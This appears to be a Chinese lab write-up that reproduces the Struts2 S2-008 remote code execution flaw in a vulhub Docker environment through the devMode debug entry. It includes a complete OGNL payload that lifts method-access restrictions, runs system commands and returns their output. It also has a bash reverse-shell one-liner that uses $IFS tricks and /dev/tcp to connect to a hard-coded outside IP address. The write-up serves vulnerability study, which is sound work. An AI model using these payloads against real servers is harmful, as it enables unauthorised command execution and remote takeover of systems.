ailx10说：这篇是2024年9月之前写的，后来又改过。做 S2-008 时，我从开发模式的调试入口进去，看 expression 怎样被求值，再试着读出命令结果和建立连接。过程中还顺手研究了 IFS、位置参数这些 shell 写法，因为请求里空格和特殊字符一变，后面执行的含义就可能跟着变。这篇因此有两条线：一条是 Struts 的调试功能为什么变成了入口，一条是载荷到底怎么被 shell 理解。开发模式这个前提不能丢，离开具体配置，只背“输入不安全”很难解释实验结果。

---

原实验使用 devmode.action 调试入口，需先确认 devMode 等配置条件。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

实验结束后在确认项目目录和 Compose 配置后关闭本项目服务；原文中的全局 Docker 清理命令已移除。

简单访问一下，说明 Struts2 S2-008 远程代码执行漏洞 环境搭建成功了

（1）命令执行OGNL表达式

```
#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("id").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()
```

denyMethodExecution 影响方法调用限制；allowStaticMethodAccess 涉及静态方法访问，两者不是同一开关。

（2）反弹shell

```
/bin/bash -c bash$IFS$9-i>&/dev/tcp/144.34.162.13/6666<&1
```

原实验中的 shell 字符串依赖 IFS、位置参数及命令解析环境；IFS 不一定只有一个空格，具体展开结果需要在隔离环境验证。

IFS和位置参数只是后面命令解释的一部分，入口条件仍在前面。把这两层分别记录，才不会把一个调试配置下的旧实验，理解成任何页面都能直接执行的命令。
